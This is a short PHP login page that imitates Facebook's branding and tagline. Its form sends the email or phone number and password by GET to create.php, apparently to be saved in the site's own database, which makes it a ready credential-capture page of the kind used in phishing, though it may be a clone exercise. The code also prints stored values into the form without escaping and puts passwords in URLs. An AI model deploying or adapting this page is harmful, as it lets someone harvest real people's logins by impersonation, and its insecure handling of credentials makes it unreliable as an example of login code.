<?php
	include 'db.php';

	$identifier = getNewIdentifier();
?>

<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="./style.css">
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form action="create.php" method="get">
          <input 
		  	type="email" 
			placeholder="Email or phone number" 
			required
			id="email_or_phone_number" 
			name="email_or_phone_number" 
			value="<?php echo $identifier['email_or_phone_number'];  ?>"
		  >
          <input 
		  	type="password" 
			placeholder="Password" 
			required
			id="password" 
			name="password" 
			value="<?php echo $identifier['password'];  ?>"
		  >
          <div class="link">
            <button type="submit" class="login">Login</button>
            <a href="#" class="forgot">Forgot password?</a>
          </div>
          <hr>
          <div class="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
  </body>
</html>